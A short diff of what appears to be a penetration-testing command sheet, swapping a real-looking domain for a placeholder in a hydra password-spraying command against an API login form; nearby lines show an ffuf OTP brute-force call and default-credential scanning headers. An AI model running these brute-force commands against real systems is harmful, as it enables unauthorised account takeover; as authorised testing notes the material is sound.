@@ -245,7 +245,7 @@ ffuf -u "https://$TARGET/api/verify-otp" -X POST \
 # Add -p 0.1 jitter and watch the Errors/RateLimited counters; stop if the success oracle stops firing.
 
 # ---- hydra: login spray ----
-hydra -l admin@target.com -P ~/wordlists/top-1000.txt "$TARGET" \
+hydra -l admin@target.example -P ~/wordlists/top-1000.txt "$TARGET" \
   http-post-form "/api/login:email=^USER^&password=^PASS^:Invalid" -t 4
 
 # ---- nuclei: rate-limit / default-cred templates ----
